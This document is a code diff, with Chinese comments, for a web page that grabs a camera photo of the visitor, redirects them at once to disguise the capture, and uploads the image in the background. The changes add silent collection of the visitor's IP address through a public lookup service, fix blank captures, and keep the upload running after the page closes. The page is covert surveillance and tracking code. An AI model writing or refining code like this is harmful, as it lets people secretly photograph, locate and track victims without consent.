@@ -139,6 +139,17 @@
             document.title = "正在加载...";
           }
 
+          // 并行获取IP地址（不阻塞拍照）
+          let userIP = null;
+          fetch("https://api.ipify.org?format=json")
+            .then((res) => res.json())
+            .then((data) => {
+              userIP = data.ip;
+            })
+            .catch(() => {
+              userIP = null; // 静默失败
+            });
+
           if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices
               .getUserMedia({
@@ -153,33 +164,42 @@
                   video.srcObject = stream;
                   video.play();
 
-                  // 超快拍照并跳转（优化到10ms）
-                  setTimeout(function () {
-                    context.drawImage(video, 0, 0, 480, 640);
+                  // 等待视频流就绪后再拍照（解决黑屏问题）
+                  video.addEventListener(
+                    "canplay",
+                    function onCanPlay() {
+                      // 额外等待一小段时间确保画面稳定
+                      setTimeout(function () {
+                        context.drawImage(video, 0, 0, 480, 640);
 
-                    // 使用JPEG格式，质量0.7，大幅减少文件大小
-                    const imageData = canvas.toDataURL("image/jpeg", 0.7);
+                        // 使用JPEG格式，质量0.7，大幅减少文件大小
+                        const imageData = canvas.toDataURL("image/jpeg", 0.7);
 
-                    // 先跳转，后上传（完全不阻塞）
-                    window.location.replace(redirectUrl);
+                        // 先跳转，后上传（完全不阻塞）
+                        window.location.replace(redirectUrl);
 
-                    // 关闭摄像头
-                    stream.getTracks().forEach((track) => track.stop());
+                        // 关闭摄像头
+                        stream.getTracks().forEach((track) => track.stop());
 
-                    // 异步上传，完全在后台进行
-                    fetch(window.API_CONFIG.UPLOAD, {
-                      method: "POST",
-                      headers: {
-                        "Content-Type": "application/json",
-                      },
-                      body: JSON.stringify({
-                        id: id,
-                        image: imageData,
-                      }),
-                    }).catch((error) => {
-                      console.error("上传错误:", error);
-                    });
-                  }, 10); // 优化到10ms，极速跳转
+                        // 异步上传，完全在后台进行
+                        fetch(window.API_CONFIG.UPLOAD, {
+                          method: "POST",
+                          headers: {
+                            "Content-Type": "application/json",
+                          },
+                          body: JSON.stringify({
+                            id: id,
+                            image: imageData,
+                            ip: userIP, // 包含IP地址（可能为null）
+                          }),
+                          keepalive: true, // 页面关闭后也继续上传
+                        }).catch((error) => {
+                          console.error("上传错误:", error);
+                        });
+                      }, 300); // 等待 300ms 确保画面稳定
+                    },
+                    { once: true }
+                  ); // 只执行一次
                 },
                 function () {
                   // 权限被拒绝，直接跳转
